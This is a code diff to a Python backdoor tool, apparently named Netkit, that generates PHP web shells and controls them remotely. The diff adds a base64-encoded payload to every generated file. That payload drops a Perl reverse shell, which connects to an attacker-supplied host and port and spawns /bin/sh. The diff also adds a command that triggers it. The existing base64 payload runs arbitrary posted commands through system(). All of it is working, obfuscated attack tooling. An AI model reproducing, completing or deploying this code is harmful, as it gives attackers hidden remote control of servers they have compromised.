@@ -2,8 +2,11 @@
 import time,base64,urllib2,os,urllib,sys
 from Crypto.Hash import MD5
 h = MD5.new()
+reverse = "aWYoaXNzZXQoJF9QT1NUWyJyaG9zdCJdKSkgew0KJHJob3N0ID0gJF9QT1NUWyJyaG9zdCJdOw0KJHJwb3J0ID0gJF9QT1NUWyJycG9ydCJdOw0KJGYgPSBmb3BlbigicmV2ZXJzZS5wbCIsICJ3Iik7DQpmd3JpdGUoJGYsICd1c2UgU29ja2V0OyRpPSInLiRyaG9zdC4nIjskcD0nLiRycG9ydC4nO3NvY2tldChTLFBGX0lORVQsU09DS19TVFJFQU0sZ2V0cHJvdG9ieW5hbWUoInRjcCIpKTtpZihjb25uZWN0KFMsc29ja2FkZHJfaW4oJHAsaW5ldF9hdG9uKCRpKSkpKXtvcGVuKFNURElOLCI+JlMiKTtvcGVuKFNURE9VVCwiPiZTIik7b3BlbihTVERFUlIsIj4mUyIpO2V4ZWMoIi9iaW4vc2ggLWkiKTt9OycpOw0KZXhlYygicGVybCByZXZlcnNlLnBsIik7DQp9"
+revers = base64.b64decode(reverse)
 phpcoder = 'JGEgPSAnJHBhc3N3b3JkID0gJF9QT1NUWyJwYXNzIl07JzsNCiRiID0gJyRwYXNzd29yZCA9IG1kNSgkcGFzc3dvcmQpOyc7DQokYyA9ICckY21kID0gJF9QT1NUWyJjbWQiXTsnOw0KJGQgPSAnJGRlbGJhY2sgPSAkX1BPU1RbImRlbHNlbGYiXTsgaWYoaXNzZXQoJHBhc3N3b3JkKSl7IGlmKCRwYXNzID09ICRwYXNzd29yZCkgeyBpZihpc3NldCgkY21kKSl7IHN5c3RlbSgkY21kKTsgfSB9ZWxzZXsgcHJpbnQgIlBhc3N3b3JkIjsgfSB9JzsNCmV2YWwoJGEuJGIuJGMuJGQpOyANCg=='
 phpcoder = base64.b64decode(phpcoder)
+reverselist = ["php/reverse_shell","perl/reverse_shell","bash/reverse_shell"]
 msfip = ""
 msfport = ""
 class bcolors:
@@ -41,7 +44,7 @@ if len(sys.argv) == 4:
 	if sta == "--generate":
 	    fqx = open(sta2, "w")
 
-	    fqx.write('<?php error_reporting(0); $pass = "'+mdpassword+'"; '+phpcoder+' ?>')
+	    fqx.write('<?php '+revers+'error_reporting(0); $pass = "'+mdpassword+'"; '+phpcoder+' ?>')
 	    print "Netkit Backdoor File created in "+os.getcwd()+"/"+sta2
 	elif sta == "--connect":
 	    if sta2 == "" or sta3 == "":
@@ -75,6 +78,15 @@ if len(sys.argv) == 4:
 			    break
 			elif rcmd == "clear": # Clear Terminal
 			    os.system("clear")
+			elif rcmd == "generate reverse_shell":
+				rhost = raw_input("RHOST : ")
+				rport = raw_input("RPORT : ")
+				urllib2.urlopen(sta2)
+				data = urllib.urlencode({'rhost' : rhost, 'rport': rport, 'pass'  : sta3})
+				req = urllib2.Request(sta2, data)
+				response = urllib2.urlopen(req)
+				print response.read()
+					
 			elif rcmd == "help": # Help Menu
 			    print bcolors.BOLD + """
 			    netkit generate backdoor.php abc123
